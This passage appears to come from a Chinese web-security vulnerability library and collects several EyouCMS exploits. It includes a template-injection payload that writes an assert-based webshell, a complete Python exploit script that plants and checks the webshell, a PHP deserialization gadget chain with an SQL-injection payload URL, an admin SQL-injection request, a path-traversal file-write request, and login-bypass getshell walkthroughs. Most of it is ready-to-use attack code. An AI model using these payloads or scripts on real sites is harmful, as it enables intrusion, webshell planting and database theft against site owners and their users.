判断是否没有$cacheFile这个缓存文件，为真则调用当前类中的compiler方法并且将$content及$cacheFile传入其中 跟踪到/core/library/think/Template.php中的**compiler**方法 private function compiler(&$content, $cacheFile) { // 判断是否启用布局 if ($this->config['layout_on']) { if (false !== strpos($content, '{__NOLAYOUT__}')) { // 可以单独定义不使用布局 $content = str_replace('{__NOLAYOUT__}', '', $content); } else { // 读取布局模板 $layoutFile = $this->parseTemplateFile($this->config['layout_name']); if (is_array($layoutFile)) { // 引入模板的错误友好提示 by 小虎哥 $content = !empty($layoutFile['msg']) ? $layoutFile['msg'] : $content; } else if ($layoutFile) { // 替换布局的主体内容 $content = str_replace($this->config['layout_item'], $content, file_get_contents($layoutFile)); } } } else { $content = str_replace('{__NOLAYOUT__}', '', $content); } // 模板解析 $this->parse($content); if ($this->config['strip_space']) { /* 去除html空格与换行 */ $find = ['~>\\s+(\\s+\\n|\\r)~']; $replace = ['>']; $content = preg_replace($find, $replace, $content); } // 优化生成的php代码 $content = preg_replace('/\\?>\\s*config['tpl_replace_string']; $content = str_replace(array_keys($replace), array_values($replace), $content); // 添加安全代码及模板引用记录 $content = 'includeFile) . '*/ ?>' . \"\\n\" . $content; // 编译存储 $this->storage->write($cacheFile, $content); $this->includeFile = []; return; } 23 Line: 将外部传入的$content传到当前类中的parse（解析模板）方法中 跟踪到/core/library/think/Template.php中的**parse**方法 public function parse(&$content) { // 内容为空不解析 if (empty($content)) { return; } // 替换eyou:literal标签内容 $this->parseEyouLiteral($content); // 替换literal标签内容 $this->parseLiteral($content); // 解析继承 $this->parseExtend($content); // 解析布局 $this->parseLayout($content); // 检查eyou:include语法 by 小虎哥 $this->parseEyouInclude($content); // 检查include语法 $this->parseInclude($content); // 替换包含文件中literal标签内容 $this->parseLiteral($content); // 替换包含文件中eyou:literal标签内容 $this->parseEyouLiteral($content); // 检查PHP语法 $this->parsePhp($content); // 获取需要引入的标签库列表 // 标签库只需要定义一次，允许引入多个一次 // 一般放在文件的最前面 // 格式： // 当TAGLIB_LOAD配置为true时才会进行检测 if ($this->config['taglib_load']) { $tagLibs = $this->getIncludeTagLib($content); if (!empty($tagLibs)) { // 对导入的TagLib进行解析 foreach ($tagLibs as $tagLibName) { $this->parseTagLib($tagLibName, $content); } } } // 预先加载的标签库 无需在每个模板中使用taglib标签加载 但必须使用标签库XML前缀 if ($this->config['taglib_pre_load']) { $tagLibs = explode(',', $this->config['taglib_pre_load']); foreach ($tagLibs as $tag) { $this->parseTagLib($tag, $content); } } // 内置标签库 无需使用taglib标签导入就可以使用 并且不需使用标签库XML前缀 $tagLibs = explode(',', $this->config['taglib_build_in']); foreach ($tagLibs as $tag) { $this->parseTagLib($tag, $content, true); } // 解析普通模板标签 {$tagName} $this->parseTag($content); // 还原被替换的eyou:Literal标签 $this->parseEyouLiteral($content, true); // 还原被替换的Literal标签 $this->parseLiteral($content, true); return; } 24 Line: 调用当前类中的parsePhp（解析php标签）方法并将$content传入 跟踪到/core/library/think/Template.php中的**parsePhp**方法 private function parsePhp(&$content) { // 短标签的情况要将' . \"\\n\", $content); // 过滤eval函数，防止被注入执行任意代码 by 小虎哥 $view_replace_str = config('view_replace_str'); if (isset($view_replace_str['__EVAL__'])) { if (stristr($content, '{eyou:php}')) { // 针对{eyou:php}标签语法处理 preg_match_all('/{eyou\\:php}.*{\\/eyou\\:php}/iUs', $content, $matchs); $matchs = !empty($matchs[0]) ? $matchs[0] : []; if (!empty($matchs)) { foreach($matchs as $key => $val){ $valNew = preg_replace('/{(\\/)?eyou\\:php}/i', '', $val); $valNew = preg_replace(\"/([\\W]+)eval(\\s*)\\(/i\", 'intval(', $valNew); $valNew = preg_replace(\"/^eval(\\s*)\\(/i\", 'intval(', $valNew); $valNew = \"{eyou:php}{$valNew}{/eyou:php}\"; $content = str_ireplace($val, $valNew, $content); } } } else if (stristr($content, '{php}')) { // 针对{php}标签语法处理 preg_match_all('/{php}.*{\\/php}/iUs', $content, $matchs); $matchs = !empty($matchs[0]) ? $matchs[0] : []; if (!empty($matchs)) { foreach($matchs as $key => $val){ $valNew = preg_replace('/{(\\/)?php}/i', '', $val); $valNew = preg_replace(\"/([\\W]+)eval(\\s*)\\(/i\", 'intval(', $valNew); $valNew = preg_replace(\"/^eval(\\s*)\\(/i\", 'intval(', $valNew); $valNew = \"{php}{$valNew}{/php}\"; $content = str_ireplace($val, $valNew, $content); } } } else if (false !== strpos($content, 'config['tpl_deny_php'] && $content = preg_replace(\"/\\?\\bphp\\b/i\", \"？ｍｕｍａ\", $content); } } // end // PHP语法检查 if ($this->config['tpl_deny_php'] && false !== strpos($content, '4 Line: 将模板中php短标签转换为21 Line: 判断传入的$content中是否包含了{php}22 Line: 使用正则表达式匹配出$content中所有包含了\"{php}任意内容{/php}\"的标签23 Line: 使用三目运算符判断匹配出来的数组中的第0个元素是否有值，如果有值那么将第0个元素的值赋给$matchs否则将空数组赋给$matchs24 Line: 判断$matchs不为空25 Line: 将$matchs使用foreach循环遍历26 Line: 将$val中的\"{/任意空白字符php}\"替换为空并赋给$valnew27 Line: 将$valnew中的\"多个或零个0-9A-Za-Z_eval(\"替换为\"intval(\"28 Line: 将$valnew中的\"开始为eval任意空白字符(\"替换为\"intval(\"29 Line: 将字符串\"{php}{$valNew}{/php}\"赋给$valnew30 Line: 将$content中的$val替换为$valNew 漏洞复现 Payload:attarray=eyJ7cGhwfXBocGluZm8oKTt7XC9waHB9Ijoie3BocH1waHBpbmZvKCk7e1wvcGhwfSJ9&html={php}phpinfo();{/php} Payload生成方式: base64_encode(jsonstring) eval会被替换成intval，所以我们采用base64加密写入webshell的方式php代码如下： file_put_contents(\"./wait.php\",base64_decode(\"PD9waHAgYXNzZXJ0KCRfUkVRVUVTVFsidyJdKTs/Pg==\")); PD9waHAgYXNzZXJ0KCRfUkVRVUVTVFsidyJdKTs/Pg==内容： 将php标签转换为json格式并加密： print base64_encode(json_encode(array(\"{php}file_put_contents('./wait.php',base64_decode(\\\"PD9waHAgYXNzZXJ0KCRfUkVRVUVTVFsidyJdKTs/Pg==\\\"));{/php}\"=>\"{php}file_put_contents('./wait.php',base64_decode(\\\"PD9waHAgYXNzZXJ0KCRfUkVRVUVTVFsidyJdKTs/Pg==\\\"));{/php}\"))); eyJ7cGhwfWZpbGVfcHV0X2NvbnRlbnRzKCcuXC93YWl0LnBocCcsYmFzZTY0X2RlY29kZShcIlBEOXdhSEFnWVhOelpYSjBLQ1JmVWtWUlZVVlRWRnNpZHlKZEtUc1wvUGc9PVwiKSk7e1wvcGhwfSI6IntwaHB9ZmlsZV9wdXRfY29udGVudHMoJy5cL3dhaXQucGhwJyxiYXNlNjRfZGVjb2RlKFwiUEQ5d2FIQWdZWE56WlhKMEtDUmZVa1ZSVlVWVFZGc2lkeUpkS1RzXC9QZz09XCIpKTt7XC9waHB9In0= pyload: attarray=eyJ7cGhwfWZpbGVfcHV0X2NvbnRlbnRzKCcuXC93YWl0LnBocCcsYmFzZTY0X2RlY29kZShcIlBEOXdhSEFnWVhOelpYSjBLQ1JmVWtWUlZVVlRWRnNpZHlKZEtUc1wvUGc9PVwiKSk7e1wvcGhwfSI6IntwaHB9ZmlsZV9wdXRfY29udGVudHMoJy5cL3dhaXQucGhwJyxiYXNlNjRfZGVjb2RlKFwiUEQ5d2FIQWdZWE56WlhKMEtDUmZVa1ZSVlVWVFZGc2lkeUpkS1RzXC9QZz09XCIpKTt7XC9waHB9In0=&htmlcode=bb htmlcode参数作为随机方式传递 poc silly@PenetrationOs:~#: python eyoucms-ssti.py -u http://192.168.1.106:8085/ -o abc [+] 正在请求目标地址:http://192.168.1.106:8085/?m=api&c=ajax&a=get_tag_memberlist [*] 目标地址http://192.168.1.106:8085/?m=api&c=ajax&a=get_tag_memberlist存活 [+] 正在向目标地址http://192.168.1.106:8085/?m=api&c=ajax&a=get_tag_memberlist写入abc.php [*] 疑似成功写入Webshell [+] 正在探测Webshell(http://192.168.1.106:8085/abc.php)是否存活 [*] Webshell(http://192.168.1.106:8085/abc.php)已存活 [*] 密码：ceshi [*] python #!/usr/bin/python -*- coding: UTF-8 -*- import requests import sys,getopt import json,base64 import time class Eyoucms: session = None headers = None password = \"ceshi\" output = \"ceshi\" requesturi = \"/?m=api&c=ajax&a=get_tag_memberlist\" def __init__(self,headers): self.headers = headers self.getparam(sys.argv[1:]) self.requestsdata = { \"attarray\":self.createpyload(), \"htmlcode\":time.time() } self.run() def getparam(self,argv): try: options, args = getopt.getopt(argv, \"h:u:p:o:\", [\"help\", \"url=\",\"password=\",\"output=\"]) except getopt.GetoptError: print 'eyoucms-ssti.py -u url -p password -o outputfile' return for option, value in options: if option in (\"-h\", \"--help\"): print 'eyoucms-ssti.py -u url' if option in (\"-u\", \"--url\"): if(self.request(value).status_code != 404): self.url = value if option in (\"-p\", \"--password\"): if(value != None): self.password = value else: self.password = \"ceshi\" if option in (\"-o\", \"--output\"): if(value != None): self.output = value.replace(\".php\",\"\") else: self.output = \"ceshi\" def run(self): url = self.url.rstrip('/')+self.requesturi print \"[+] 正在请求目标地址:%s\"%(url) if(self.request(url).status_code == 200): print \" 目标地址%s存活\"%url else: print \"[-] 目标地址%s探测失败\"%url return print \"[+] 正在向目标地址%s写入%s.php\"%(url,self.output) if(self.request(url,\"post\").status_code == 200): print \" 疑似成功写入Webshell\" shell = self.url.rstrip('/')+\"/%s.php\"%self.output print \"[+] 正在探测Webshell(%s)是否存活\"%(shell) if(self.request(shell).status_code == 200): print \" Webshell(%s)已存活\\n 密码：%s\"%(shell,self.password) def createpyload(self): short = base64.b64encode(\"\"%self.password) file = self.output payload = { \"{php}1{/php}\":\"{php}file_put_contents('./%s.php',base64_decode('%s'));{/php}\"%(file,short) } return base64.b64encode(json.dumps(payload)) def request(self,url,method=\"get\"): respone = None if(not self.session): self.session = requests.Session() if(method == \"get\"): try: respone = self.session.get(url=url,headers=self.headers) except requests.exceptions.ConnectTimeout: print \"[-] 请求%s超时\"%url return except requests.exceptions.ConnectionError: print \"[-] 请求%s无效\"%url return return respone elif(method == \"post\"): try: respone = self.session.post(url=url,data=self.requestsdata,headers=self.headers) except requests.exceptions.ConnectTimeout: print \"[-] 请求%s超时\"%url return except requests.exceptions.ConnectionError: print \"[-] 请求%s无效\"%url return return respone if __name__ == \"__main__\": headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0\", \"X-Requested-With\":\"XMLHttpRequest\" } Eyoucms(headers) 参考链接 https://bbs.ichunqiu.com/thread-56458-1-1.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:56 "},"Web安全/Eyoucms/Eyoucms 1.4.2 sql注入/Eyoucms 1.4.2 sql注入.html":{"url":"Web安全/Eyoucms/Eyoucms 1.4.2 sql注入/Eyoucms 1.4.2 sql注入.html","title":"Eyoucms 1.4.2 sql注入","keywords":"","body":"Eyoucms 1.4.2 sql注入 一、漏洞简介 二、漏洞影响 三、复现过程 介绍漏洞之前先了解下这套CMS，EyouCms是基于TP5.0（5.0.24）框架为核心开发的免费+开源的企业内容管理系统。 Payload: http://0-sec.org/index.php?m=user&c=pay&a=pay_recharge_detail&querystr=YToyOntzOjc6Im1vbmV5aWQiO2k6MTtzOjEyOiJvcmRlcl9udW1iZXIiO086MTc6InRoaW5rXG1vZGVsXFBpdm90Ijo4OntzOjk6IgAqAGFwcGVuZCI7YToxOntzOjQ6InZhYWEiO3M6NDoic2F2ZSI7fXM6NzoiACoAZGF0YSI7YToxOntzOjg6InVzZXJuYW1lIjtzOjg6ImFzZGEyMTIyIjt9czo5OiIAKgBpbnNlcnQiO2E6MDp7fXM6NToiACoAcGsiO3M6NToidXNlcnMiO3M6ODoiACoAZmllbGQiO2E6Mjp7aTowO3M6ODoidXNlcnNfaWQiO2k6MTtzOjg6InVzZXJuYW1lIjt9czo4OiIAKgB0YWJsZSI7czo4OiJleV91c2VycyI7czoxMToiACoAaXNVcGRhdGUiO2I6MTtzOjE0OiIAKgB1cGRhdGVXaGVyZSI7czoyNzoidXNlcnNfaWQgPSA1KSBhbmQgc2xlZXAoNSkjIjt9fQ== 漏洞文件：/EyouCMS-V1.4.2-UTF8-SP2/application/user/controller/Pay.php 漏洞函数：pay_recharge_detail public function pay_recharge_detail() { $querystr = input('param.querystr/s'); $querydata = unserialize(base64_decode($querystr)); if (!empty($querydata['moneyid']) && !empty($querydata['order_number'])) { 这莫非是？？？没错就是反序列化导致的漏洞（这里标题写了sql注入，其实更准确说应该是增删改查漏洞，如果需要再具体一点那就是THINKPHP反序列化增删改查漏洞）。这里只报错来测试下sql注入 经测试，上述的payload无法执行，因为框架源码替换了 public function __call($method, $args) { if (array_key_exists($method, self::$hook)) { array_unshift($args, $this); return call_user_func_array(self::$hook[$method], $args); } else { throw new Exception('method not exists:' . __CLASS__ . '->' . $method); } } 先说一下我们的反序列化利用点，到后面会调用__toString函数。而我们这里就可以跳过构造think\\process\\pipes\\Windows 类。直接去构造继承Model类的子类。流程如下： toArray()代码在这（一部分） if (!empty($this->append)) { foreach ($this->append as $key => $name) { if (is_array($name)) { // 追加关联对象属性 $relation = $this->getAttr($key); $item[$key] = $relation->append($name)->toArray(); } elseif (strpos($name, '.')) { list($key, $attr) = explode('.', $name); // 追加关联对象属性 $relation = $this->getAttr($key); $item[$key] = $relation->append([$attr])->toArray(); } else { $relation = Loader::parseName($name, 1, false); if (method_exists($this, $relation)) { $modelRelation = $this->$relation(); //我是重点我是重点我是重点我是重点我是重点我是重点我是重点我是重点我是重点我是重点我是重点 $value = $this->getRelationData($modelRelation); if (method_exists($modelRelation, 'getBindAttr')) { $bindAttr = $modelRelation->getBindAttr(); if ($bindAttr) { foreach ($bindAttr as $key => $attr) { $key = is_numeric($key) ? $attr : $key; if (isset($this->data[$key])) { throw new Exception('bind attr has exists:' . $key); } else { $item[$key] = $value ? $value->getAttr($attr) : null; } } continue; } } $item[$name] = $value; } else { $item[$name] = $this->getAttr($name); } } } } 心细的小伙伴可能发现了 $this->$relation(); 呸是个人都能发现好不嘞。这里可以调用当前类下所有方法。而数据库增删改查操作也是定义在Model类下。可以忽略parseName函数（无影响），但如果你非要看，呸，我就是不给你看。 首先append属性是我们可以控制的。我们只需要构造append让他进入else分支就够了。然后我们就可以执行相应的数据库操作函数。save、delete、update等。 构造利用链： append = [\"vaaa\"=>\"save\"]; $this->data = [\"username\"=>\"asda2122\"]; $this->pk = \"users\"; $this->table = \"ey_users\"; $this->field = ['users_id','username']; $this->isUpdate = true; $this->updateWhere = \"users_id = 5) and (extractvalue(1,concat(0x5c,(select user()))))#\"; } } namespace think\\model; use think\\Model; class Pivot extends Model { } use think\\model\\Pivot; $arr['moneyid'] = 1; $arr['order_number'] = new Pivot; echo base64_encode(serialize($arr)); ?> 生成Payload： http://0-sec.org/index.php?m=user&c=pay&a=pay_recharge_detail&querystr=YToyOntzOjc6Im1vbmV5aWQiO2k6MTtzOjEyOiJvcmRlcl9udW1iZXIiO086MTc6InRoaW5rXG1vZGVsXFBpdm90Ijo4OntzOjk6IgAqAGFwcGVuZCI7YToxOntzOjQ6InZhYWEiO3M6NDoic2F2ZSI7fXM6NzoiACoAZGF0YSI7YToxOntzOjg6InVzZXJuYW1lIjtzOjg6ImFzZGEyMTIyIjt9czo5OiIAKgBpbnNlcnQiO2E6MDp7fXM6NToiACoAcGsiO3M6NToidXNlcnMiO3M6ODoiACoAZmllbGQiO2E6Mjp7aTowO3M6ODoidXNlcnNfaWQiO2k6MTtzOjg6InVzZXJuYW1lIjt9czo4OiIAKgB0YWJsZSI7czo4OiJleV91c2VycyI7czoxMToiACoAaXNVcGRhdGUiO2I6MTtzOjE0OiIAKgB1cGRhdGVXaGVyZSI7czo2NToidXNlcnNfaWQgPSA1KSBhbmQgKGV4dHJhY3R2YWx1ZSgxLGNvbmNhdCgweDVjLChzZWxlY3QgdXNlcigpKSkpKSMiO319 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:57 "},"Web安全/Eyoucms/Eyoucms 1.4.2 后台注入/Eyoucms 1.4.2 后台注入.html":{"url":"Web安全/Eyoucms/Eyoucms 1.4.2 后台注入/Eyoucms 1.4.2 后台注入.html","title":"Eyoucms 1.4.2 后台注入","keywords":"","body":"Eyoucms 1.4.2 后台注入 一、漏洞简介 二、漏洞影响 三、复现过程 漏洞分析 /application/admin/controller/Index.php public function changeTableVal() { if (IS_AJAX_POST) { $url = null; $data = [ 'refresh' => 0, ]; $table = input('post.table/s'); // 表名 $id_name = input('post.id_name/s'); // 表主键id名 $id_value = input('post.id_value/s'); // 表主键id值 $field = input('post.field/s'); // 修改哪个字段 $value = input('post.value/s', '', null); // 修改字段值 switch ($table) { // 会员等级表 case 'users_level': { $return = model('UsersLevel')->isRequired($id_name,$id_value,$field,$value); if (is_array($return)) { $this->error($return['msg']); } } break; // 会员属性表 case 'users_parameter': { $return = model('UsersParameter')->isRequired($id_name,$id_value,$field,$value); if (is_array($return)) { $this->error($return['msg']); } } break; // 会员中心菜单表 case 'users_menu': { Db::name('users_menu')->where('id','gt',0)->update([ 'is_userpage' => 0, 'update_time' => getTime(), ]); $data['refresh'] = 1; } break; // 会员投稿功能 case 'archives': { if ('arcrank' == $field) { if (0 == $value) { $value = -1; }else{ $value = 0; } } } break; // 会员产品类型表 case 'users_type_manage': { if (empty($value)) { $this->error('不可为空'); } } break; default: # code... break; } $savedata = [ $field => $value, 'update_time' => getTime(), ]; M($table)->where(\"$id_name = $id_value\")->cache(true,null,$table)->save($savedata); // 根据条件保存修改的数据 // 以下代码可以考虑去掉，与行为里的清除缓存重复 AppEndBehavior.php / clearHtmlCache switch ($table) { case 'auth_modular': extra_cache('admin_auth_modular_list_logic', null); extra_cache('admin_all_menu', null); break; default: // 清除logic逻辑定义的缓存 extra_cache('admin_'.$table.'_list_logic', null); // 清除一下缓存 // delFile(RUNTIME_PATH.'html'); // 先清除缓存, 否则不好预览 \\think\\Cache::clear($table); break; } /*清除页面缓存*/ // $htmlCacheLogic = new \\app\\common\\logic\\HtmlCacheLogic; // $htmlCacheLogic->clear_archives(); /*--end*/ $this->success('更新成功', $url, $data); } } 第307行： M($table)->where(\"$id_name = $id_value\")->cache(true,null,$table)->save($savedata); // 根据条件保存修改的数据 直接将函数头获取的POST传入SQL语句里面： $table = input('post.table/s'); // 表名 $id_name = input('post.id_name/s'); // 表主键id名 $id_value = input('post.id_value/s'); // 表主键id值 $field = input('post.field/s'); // 修改哪个字段 $value = input('post.value/s', '', null); // 修改字段值 漏洞复现 payload： http://0-sec.org/eyou/?m=admin&c=Index&a=changeTableVal post: table=admin&id_name=admin_id&id_value='1'//and//updatexml(1,concat(0x7e,user(),0x7e),1) 四、参考链接 http://www.f4ckweb.top/index.php/archives/47/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:58 "},"Web安全/Eyoucms/Eyoucms 1.4.3 csrf漏洞/Eyoucms 1.4.3 csrf漏洞.html":{"url":"Web安全/Eyoucms/Eyoucms 1.4.3 csrf漏洞/Eyoucms 1.4.3 csrf漏洞.html","title":"Eyoucms 1.4.3 csrf漏洞","keywords":"","body":"Eyoucms 1.4.3 csrf漏洞 一、漏洞简介 可通过csrf漏洞添加管理员 二、漏洞影响 Eyoucms 1.4.3 三、复现过程 漏洞分析 漏洞触发点在application\\admin\\controller\\Admin.php public function admin_add() { $this->language_access(); // 多语言功能操作权限 if (IS_POST) { $data = input('post.'); if (0 error(\"超级管理员才能操作！\"); } if (empty($data['password']) || empty($data['password2'])) { $this->error(\"密码不能为空！\"); }else if ($data['password'] != $data['password2']) { $this->error(\"两次密码输入不一致！\"); } ... if (empty($data['pen_name'])) { $data['pen_name'] = $data['user_name']; } if (M('admin')->where(\"user_name\", $data['user_name'])->count()) { $this->error(\"此用户名已被注册，请更换\",url('Admin/admin_add')); } else { $admin_id = M('admin')->insertGetId($data); if ($admin_id) { adminLog('新增管理员：'.$data['user_name']); /*同步追加一个后台管理员到会员用户表*/ try { $usersInfo = Db::name('users')->field('users_id')->where([ 'username' => $data['user_name'], 'lang' => $this->admin_lang, ])->find(); if (!empty($usersInfo)) { $r = Db::name('users')->where(['users_id'=>$usersInfo['users_id']])->update([ 'nickname' => $data['user_name'], 'admin_id' => $admin_id, 'is_activation' => 1, 'is_lock' => 0, 'is_del' => 0, 'update_time' => getTime(), ]); !empty($r) && $users_id = $usersInfo['users_id']; } else { // 获取要添加的用户名 ... $users_id = Db::name('users')->insertGetId($AddData); } if (!empty($users_id)) { Db::name('admin')->where(['admin_id'=>$admin_id])->update([ 'syn_users_id' => $users_id, 'update_time' => getTime(), ]); } } catch (\\Exception $e) {} /* END */ $this->success(\"操作成功\", url('Admin/index')); } else { $this->error(\"操作失败\"); } } } 可以看到进队管理员权限进行校验，而没有对提交token进行校验，导致恶意用户可引导管理员点击构造的url进行管理员添加，实际操作可不跳转到管理页面，以免引起怀疑。 漏洞复现 登陆后台，在高级选项>管理员>新增管理员点击之后截包 poc history.pushState('', '', '/') 模拟管理员点击 添加完成 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:59 "},"Web安全/Eyoucms/Eyoucms 1.4.3 任意文件写入/Eyoucms 1.4.3 任意文件写入.html":{"url":"Web安全/Eyoucms/Eyoucms 1.4.3 任意文件写入/Eyoucms 1.4.3 任意文件写入.html","title":"Eyoucms 1.4.3 任意文件写入","keywords":"","body":"Eyoucms 1.4.3 任意文件写入 一、漏洞简介 可写入html,css,js,txt文件，总体来说比较鸡肋。 二、漏洞影响 Eyoucms 1.4.3 三、复现过程 漏洞分析 漏洞点只对filename进行过滤，而忘了activepath也可以../进行跳转 application/admin/controller/Filemanager.php if (IS_POST) { $post = input('post.', '', null); $content = input('post.content', '', null); $filename = !empty($post['filename']) ? trim($post['filename']) : ''; $content = !empty($content) ? $content : ''; $activepath = !empty($post['activepath']) ? trim($post['activepath']) : ''; ... ... $r = $this->filemanagerLogic->editFile($filename, $activepath, $content); if ($r === true) { $this->success('操作成功！', url('Filemanager/index', array('activepath'=>$this->filemanagerLogic->replace_path($activepath, ':', false)))); exit; } else { ... ... 跟进editFile函数 application/admin/logic/FilemanagerLogic.php public function editFile($filename, $activepath = '', $content = '') { $fileinfo = pathinfo($filename);// pathinfo获取后缀 $ext = strtolower($fileinfo['extension']); ...... /*允许编辑的文件类型*/ if (!in_array($ext, $this->editExt)) { //>>>> return '只允许操作文件类型如下：'.implode('|', $this->editExt); } /*--end*/ $filename = str_replace(\"..\", \"\", $filename);// 仅对filename进行过滤 $file = $this->baseDir.\"$activepath/$filename\"; // 此处直接拼接产生漏洞 if (!is_writable(dirname($file))) { return \"请把模板文件目录设置为可写入权限！\"; } if ('css' != $ext) { $content = htmlspecialchars_decode($content, ENT_QUOTES); $content = preg_replace(\"/(@)?eval(\\s*)\\(/i\", 'intval(', $content);// // $content = preg_replace(\"/\\?\\bphp\\b/i\", \"？ｍｕｍａ\", $content); } $fp = fopen($file, \"w\"); fputs($fp, $content); fclose($fp); return true; } 漏洞复现 poc POST /eyoucms/login.php?m=admin&c=Filemanager&a=newfile&lang=cn HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (X11; Linux i686; rv:67.0) Gecko/20100101 Firefox/67.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 94 Origin: http://127.0.0.1 Connection: close Referer: http://127.0.0.1/eyoucms/login.php?m=admin&c=Filemanager&a=newfile&activepath=%3Atemplate%3Aplugins%3Atest&lang=cn Cookie: home_lang=cn; admin_lang=cn; PHPSESSID=h6k34lgf1svcatllongehqqdt0; workspaceParam=index%7CFilemanager; XDEBUG_SESSION=18705 Upgrade-Insecure-Requests: 1 activepath=%2Ftemplate%2Fplugins%2Ftest/../../../uploads/tmp&filename=newfile.htm&content=test Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:52:00 "},"Web安全/Eyoucms/Eyoucms 1.4.3 后台代码执行漏洞/Eyoucms 1.4.3 后台代码执行漏洞.html":{"url":"Web安全/Eyoucms/Eyoucms 1.4.3 后台代码执行漏洞/Eyoucms 1.4.3 后台代码执行漏洞.html","title":"Eyoucms 1.4.3 后台代码执行漏洞","keywords":"","body":"Eyoucms 1.4.3 后台代码执行漏洞 一、漏洞简介 Eyoucms v1.4.3 版本后台修改模板文件可代码执行 二、漏洞影响 Eyoucms 1.4.3 三、复现过程 从官网下载最新版反复确认v1.4.3暂未修复。利用也很简单直接在高级选项 -> 模板管理 -> 修改pc模板。修改index.htm为例。 回到index页面刷新 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:52:00 "},"Web安全/Eyoucms/Eyoucms 1.42 后台插件getshell/Eyoucms 1.42 后台插件getshell.html":{"url":"Web安全/Eyoucms/Eyoucms 1.42 后台插件getshell/Eyoucms 1.42 后台插件getshell.html","title":"Eyoucms 1.42 后台插件getshell","keywords":"","body":"Eyoucms 1.42 后台插件getshell 一、漏洞简介 需要进后台+知道后台插件密码 二、漏洞影响 三、复现过程 需要知道后台密码+后台插件密码 //如果第一次使用插件，那么密码可以直接设置，如果管理员设置过了，则可以选择爆破 插件有格式限制，可以从官网随便下个，解压后插入php文件重新打包上传 可以看出文件已成功解压到服务器 直接访问403，分析了下受.htaccess影响不能解析，在php文件目录增加该文件并删除php,重新上传该插件，即可解析 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:52:10 "},"Web安全/Eyoucms/EyouCMS 1.5.2 后台文件包含漏洞/EyouCMS 1.5.2 后台文件包含漏洞.html":{"url":"Web安全/Eyoucms/EyouCMS 1.5.2 后台文件包含漏洞/EyouCMS 1.5.2 后台文件包含漏洞.html","title":"EyouCMS 1.5.2 后台文件包含漏洞","keywords":"","body":"EyouCMS 1.5.2 后台文件包含漏洞 利用思路 前台设置一个管理员的session 后台远程插件下载文件包含getshell。 前台设置管理员session 在application/api/controller/Ajax.php:219 get_token函数是可以前台随意调用的，另外形参中的$name变量也是通过http传递进来的。跟进token函数，如下图所示。 箭头处有一个设置session的操作，名字是可控的，而值是请求时间戳md5的值。不可控。 既然可以设置任意session名字了，那么我们是否可以给自己一个管理员的session呢？ 然后我们梳理一下后台管理员的登录逻辑。 在application/admin/controller/B ase.php:61 这里涉及到了两个session，一个admin_login_expire，一个admin_id。 admin_id （该session有就即可，不会验证其值） admin_login_expire （该session会做减法的校验，需要满足一定条件） 而我们设置的session中是md5字符串，因此在设置admin_login_expire时，需要挑选一个前面是很长一段数字的md5，这样计算出来的结果就是负数，就满足该if条件了。 如图所示： 设置完这两个session后，我们继续看到if条件判断里还有一个check_priv函数，跟进查看： 这里就很简单了，继续设置一个admin_info.role_id。满足比较小于0即可。 设置完三个session后，就可以进后台了，如图所示： 后台远程插件下载getshell 在application/admin/controller/Weapp.php:1285 这里传进来一个$url，然后做一个url解析，需要满足host为eyoucms.com。 也就是程序限制只能从官网下载插件安装，但是这个校验太简单了，可以绕。 然后下文就是请求这个下载链接，做解压操作，并包含进来config.php。 然后开始准备制作恶意压缩包，也就是如下图所示的目录结构： 然后去官网转一转，看看有没有上传的地方，还真有！在提问功能处可以上传图片 然后我们把恶意压缩包改成图片后缀传上去，得到一个上传后的图片路径，在构造报文触发文件包含。 生成webshell。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:52:01 "},"Web安全/Eyoucms/EyouCMS登录绕过和后台远程下载文件包含getshell/EyouCMS登录绕过和后台远程下载文件包含getshell.html":{"url":"Web安全/Eyoucms/EyouCMS登录绕过和后台远程下载文件包含getshell/EyouCMS登录绕过和后台远程下载文件包含getshell.html","title":"EyouCMS登录绕过和后台远程下载文件包含getshell","keywords":"","body":"EyouCMS登录绕过和后台远程下载文件包含getshell 漏洞描述 EyouCMS是一个自由和开放源码的内容管理系统，它是一个可以独立使用的内容发布系统，该系统存在登录绕过后可远程下载getshell。 漏洞影响 EyouCMS FOFA \"EyouCMS\" 漏洞复现 前台设置一个管理员的session 后台远程插件下载文件包含getshell。 前台设置管理员session 在application/api/controller/Ajax.php:219 get_token函数是可以前台随意调用的，另外形参中的$name变量也是通过http传递进来的。跟进token函数，如下图所示。 箭头处有一个设置session的操作，名字是可控的，而值是请求时间戳md5的值。不可控。 既然可以设置任意session名字了，那么我们是否可以给自己一个管理员的session呢？ 然后我们梳理一下后台管理员的登录逻辑。 在application/admin/controller/Base.php:61 这里涉及到了两个session，一个admin_login_expire，一个admin_id。 admin_id （该session有就即可，不会验证其值） admin_login_expire （该session会做减法的校验，需要满足一定条件） 而我们设置的session中是md5字符串，因此在设置admin_login_expire时，需要挑选一个前面是很长一段数字的md5，这样计算出来的结果就是负数，就满足该if条件了。 如图所示： 设置完这两个session后，我们继续看到if条件判断里还有一个check_priv函数，跟进查看： 这里就很简单了，继续设置一个admin_info.role_id。满足比较小于0即可。 设置完三个session后，就可以进后台了，如图所示： 后台远程插件下载getshell 在application/admin/controller/Weapp.php:1285 这里传进来一个$url，然后做一个url解析，需要满足host为eyoucms.com。 也就是程序限制只能从官网下载插件安装，但是这个校验太简单了，可以绕。 然后下文就是请求这个下载链接，做解压操作，并包含进来config.php。 然后开始准备制作恶意压缩包，也就是如下图所示的目录结构： 然后去官网转一转，看看有没有上传的地方，还真有！在提问功能处可以上传图片 然后我们把恶意压缩包改成图片后缀传上去，得到一个上传后的图片路径，在构造报文触发文件包含。 注:文章中出现的zc.com的地址，为本地测试地址127.0.0.1，请勿进行其他测试 